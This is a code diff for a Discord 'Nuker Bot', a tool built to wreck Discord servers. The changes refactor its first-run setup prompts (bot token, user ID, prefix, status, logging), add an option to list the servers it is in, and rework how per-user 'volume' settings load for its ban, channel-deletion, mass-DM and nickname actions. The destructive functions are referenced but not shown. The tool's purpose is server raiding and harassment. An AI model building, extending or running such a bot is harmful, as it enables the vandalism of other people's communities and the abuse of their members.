@@ -1,5 +1,4 @@
 # Made by KingWaffleIII and QuantumFox42
-
 # Nuker Bot
 # v1.9 Beta
 
@@ -15,42 +14,34 @@ from json import loads, dumps
 
 if "settings.json" not in listdir():
     # First time setup
-    print(
-        "No settings.json found. Performing first time setup.\nPlease make sure to enter all values correctly.\nIf you wish to restart the first time setup, simply delete the settings.json file.")
+    print("No settings.json found. Performing first time setup.\nPlease make sure to enter all values correctly.\nIf you wish to restart the first time setup, simply delete the settings.json file.")
 
     # Main Variables
     TOKEN = input("Please input your bot's token and press enter to continue: ")
-    USER_ID = input(
-        "If you would like the bot to only work for you, please input your user ID on Discord, otherwise leave blank and then press enter to continue: ")
+    USER_ID = input("If you would like the bot to only work for you, please input your userid, otherwise leave blank and then press enter to continue: ")
     PREFIX = input("Please enter the command prefix you would like to use: ")
-    if USER_ID == "":
-        USER_ID = False
-    else:
-        USER_ID = int(USER_ID)
+    if USER_ID == "": USER_ID = False
+    else: USER_ID = int(USER_ID)
 
     # Status
-    input1 = input("Would you like to setup a status? (Y/n) ").lower()
-    if input1 == "y" or input1 == "":
-        statustype = input(
-            "Please enter the status type you would like to use [playing/streaming/listening/watching]: ")
+    if input("Would you like to setup a status? (Y for yes): ").lower() == "y":
+        statustype = input("Please enter the status type you would like to use (Your options are: playing, streaming, listening and watching): ")
         statustext = input("Please enter the text for your status: ")
         STATUS = f"{statustype},{statustext}"
-    else:
-        STATUS = False
+    else: STATUS = False
 
     # Log Variables
-    input2 = input("Would you like logging to be turned on? (Y/n) ").lower()
-    if input2 == "y" or input2 == "":
-        LOG = True
-    else:
-        LOG = False
-
+    if input("Would you like logging to be turned on? (Y/N): ").lower() == "y": LOG = True
+    else: LOG = False
     LOGFILE = "nuker_bot_log.txt"
 
-    towrite = dumps(
-        {"TOKEN": TOKEN, "USERID": USER_ID, "PREFIX": PREFIX, "STATUS": STATUS, "LOG": LOG, "LOGFILE": LOGFILE,
-         "ROLE_IDS": {}, "VOLUMESETTINGS": {}})
+    # Show connected servers on startup
+    if input("Would you like the bot to display all the servers it is in on startup? (Y/N): ").lower() == "y": SHOWCONNECTEDSERVERS = True
+    else: SHOWCONNECTEDSERVERS = False
 
+    towrite = dumps({"TOKEN": TOKEN, "USERID": USER_ID, "PREFIX": PREFIX, "STATUS": STATUS, "LOG": LOG, "LOGFILE": LOGFILE,"ROLE_IDS": {}, "VOLUMESETTINGS": {}})
+
+    # Writes settings to file
     file = open("settings.json", "w+")
     file.write(towrite)
     file.close()
@@ -157,13 +148,6 @@ config_options = {
     6: "dm",
     7: "nick"
 }
-
-# check for pre-existing volume settings
-if getVolumeSettings() is not False:
-    volume_settings = getVolumeSettings()
-else:
-    volume_settings = {
-    }
 
 
 # nuking functions
@@ -368,8 +352,8 @@ async def on_message(msg):
                     colour=0xff0000
                 )
                 await msg.channel.send(content=None, embed=embed)
-        else:
-            await bot.process_commands(msg)
+        
+        else: await bot.process_commands(msg)
 
 
 # nukes the server
@@ -515,10 +499,13 @@ Server Owner: {ctx.guild.owner}
 async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optional[str]):
     if not isinstance(ctx.channel, discord.channel.DMChannel):
         await ctx.message.delete()
+    
     if USER_ID is not False and ctx.message.author.id != USER_ID:
         return
 
-    if f"{ctx.message.author.id}" not in volume_settings:  # write default settings if entry doesn't exist
+    volume_settings=getVolumeSettings()
+
+    if f"{ctx.message.author.id}" not in volume_settings.keys():  # write default settings if entry doesn't exist
         volume_settings[f"{ctx.message.author.id}"] = {
             "ban": True,
             "channels": True,
@@ -625,7 +612,7 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
             "dm": config_6,
             "nick": config_7
         }
-        writeVolumeSettings(volume_settings)
+    writeVolumeSettings(volume_settings)
 
 
 @bot.command(name="skip")
@@ -635,7 +622,9 @@ async def skip(ctx):
         if ctx.message.author.id != USER_ID:
             return
 
-    if f"{ctx.message.author.id}" not in volume_settings:
+    volume_settings = getVolumeSettings()
+
+    if f"{ctx.message.author.id}" not in volume_settings.keys():
         volume_settings[f"{ctx.guild.id}"] = {
             "ban": True,
             "channels": True,
